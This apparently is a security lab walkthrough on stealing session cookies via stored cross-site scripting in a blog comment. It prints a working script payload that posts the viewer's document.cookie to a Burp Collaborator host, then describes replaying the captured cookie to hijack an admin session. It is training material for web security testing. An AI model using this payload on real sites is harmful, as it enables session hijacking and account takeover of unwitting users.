## stealing cookies 

Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.

Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.

Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
```
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their cookie.

Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.

You should see an HTTP interaction. Take a note of the value of the victim's cookie in the POST body.

Then reload the main blog page, using Burp Proxy or Burp Repeater to replace your own cookie with the captured value. You should see an "Hello, admin" message within the response, demonstrating that you have successfully hijacked the admin user's session.
